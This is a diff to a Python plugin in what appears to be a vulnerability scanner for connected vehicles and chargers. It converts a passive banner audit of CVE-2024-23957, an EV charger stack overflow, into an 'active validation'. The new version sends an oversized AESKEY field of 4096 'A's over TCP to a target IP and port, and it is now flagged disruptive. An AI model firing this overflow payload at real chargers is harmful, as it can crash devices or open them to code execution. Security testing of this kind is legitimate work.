@@ -1,5 +1,5 @@
 #!/usr/bin/env python3
-"""Safe CVE exposure audit PoC for connected-vehicle vulnerability intelligence."""
+"""Active validation PoC for connected-vehicle vulnerability scanning."""
 from __future__ import annotations
 
 from active_validation_core import run_active_validation
@@ -64,23 +64,24 @@ VULN = {
         "Authentication",
         "required",
         "MaxiCharger AC Elite Business C50"
-    ]
+    ],
+    "active_payload_text": "DLB_HostHeartBeat|" + "AESKEY=" + ("A" * 4096) + "|SEQ=1|MODE=sync",
 }
 
 
 class Poc31CVE202423957StackOverflowRCEAuditPlugin(IVIVulnerabilityPlugin):
     meta_display_id = 'XLSX-037'
-    meta_poc_name = 'CVE-2024-23957 栈溢出/RCE Exposure Audit'
+    meta_poc_name = 'CVE-2024-23957 栈溢出/RCE Active Validation'
     meta_cve_id = 'CVE-2024-23957'
     meta_severity = 'High'
-    meta_protocol = 'ocpp'
+    meta_protocol = 'tcp'
     meta_target_os = ['all']
-    meta_required_params = ['service_banner']
+    meta_required_params = ['target_ip', 'target_port']
     meta_profiles = ['network']
     meta_source_url = 'https://nvd.nist.gov/vuln/detail/CVE-2024-23957'
     meta_attack_surface = '网络服务'
-    is_disruptive = False
-    meta_destructive_level = "Safe"
+    is_disruptive = True
+    meta_destructive_level = "Disruptive"
 
     def check_prerequisites(self):
         return True
